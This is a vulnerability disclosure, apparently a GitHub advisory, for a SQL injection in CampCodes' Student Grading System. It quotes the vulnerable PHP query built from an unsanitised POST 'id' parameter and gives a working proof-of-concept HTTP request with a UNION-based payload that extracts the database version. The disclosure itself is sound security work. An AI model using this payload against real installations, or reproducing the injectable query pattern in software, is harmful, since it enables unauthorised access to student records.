# SQL Injection in Student Grading System


## Vendor and Product information:
* **Vendor:** CampCodes
* **Product:** Student Grading System
* **Product URL:** https://www.campcodes.com/projects/php/student-grading-system-using-php-mysql-free-download/

## Code
~~~ php
    <?php
    include 'db.php';
    $id = $_POST['id'];
  if($_POST['id']){
    $sql = mysqli_query($conn, "SELECT * From student_info left join program on student_info.PROGRAM = program.PROGRAM_ID where STUDENT_ID = '$id'");
    while($row = mysqli_fetch_assoc($sql)){
     ?>
~~~

## Proof of Concept
**HTTP Request Example**
``` http request
POST /grading/view_students.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 78
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/grading/rms.php?page=Students
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=2'+union+select+1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-
```

## Screenshot
![image](https://github.com/user-attachments/assets/9fb19251-69a3-4685-a78b-1562127d3996)


## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
